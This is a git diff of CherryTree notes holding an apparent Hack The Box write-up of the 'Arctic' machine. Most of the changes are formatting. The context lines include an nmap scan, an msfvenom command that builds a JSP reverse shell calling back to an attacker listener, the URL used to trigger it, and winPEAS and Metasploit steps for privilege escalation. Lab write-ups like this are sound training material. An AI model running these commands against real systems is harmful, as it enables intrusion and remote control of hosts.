@@ -22,6 +22,7 @@ Windows Proof: </rich_text>
         <rich_text>Since normal nmap didnt work we will use 
 
 </rich_text>
+        <rich_text justification="left"></rich_text>
         <codebox char_offset="43" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">                                                                                                                                                            
  Writeups  nmap -sC -sV -Pn -T4 10.10.10.11 -o HTB/Arctic/nmap/nmap_all_tcp
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-11-19 10:03 EST
@@ -40,26 +41,36 @@ Nmap done: 1 IP address (1 host up) scanned in 165.15 seconds
       </node>
       <node name="foothold" unique_id="105" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1700406863" ts_lastsave="1700410117">
         <rich_text>on visiting
-
+</rich_text>
+        <rich_text justification="left"></rich_text>
+        <rich_text>
 we see two directory
 
 on browsing through we find
 
-
+</rich_text>
+        <rich_text justification="left"></rich_text>
+        <rich_text>
 
 which has apache coldfusion
 
 we find the following exploit
 
-
+</rich_text>
+        <rich_text justification="left"></rich_text>
+        <rich_text>
 
 
 and use the following to create a reverse  jsp shell
-
+</rich_text>
+        <rich_text justification="left"></rich_text>
+        <rich_text>
 
 so we will upload this and start the listener and we should get a revshell after visiting
 
-
+</rich_text>
+        <rich_text justification="left"></rich_text>
+        <rich_text>
 
 
 and we get the user flag
@@ -70,7 +81,7 @@ and we get the user flag
         <codebox char_offset="185" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.19 LPORT=4445 -o rev.jsp</codebox>
         <codebox char_offset="279" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">http://10.10.10.11:8500/userfiles/file/exploit.jsp</codebox>
       </node>
-      <node name="privEsc" unique_id="106" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1700411050" ts_lastsave="1700434614">
+      <node name="privEsc" unique_id="106" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1700411050" ts_lastsave="1700435329">
         <rich_text>we will download this </rich_text>
         <rich_text link="webs https://github.com/carlospolop/PEASS-ng/releases/download/20231119-295ce4ea/winPEASany.exe">https://github.com/carlospolop/PEASS-ng/releases/download/20231119-295ce4ea/winPEASany.exe</rich_text>
         <rich_text> to
@@ -139,7 +150,9 @@ and then we run a new listener </rich_text>
 
 and then run the following command on windows
 
-
+</rich_text>
+        <rich_text justification="left"></rich_text>
+        <rich_text>
 
 
 that also didnt work so i broke down and used msfconsole and used exploit suggester and the same vuln
@@ -256,9 +269,13 @@ Windows Proof: </rich_text>
 User.txt:
 
 
+</rich_text>
+        <rich_text justification="left"></rich_text>
+        <rich_text>
 
-
-
+</rich_text>
+        <rich_text justification="left"></rich_text>
+        <rich_text>
 
 
 root.txt
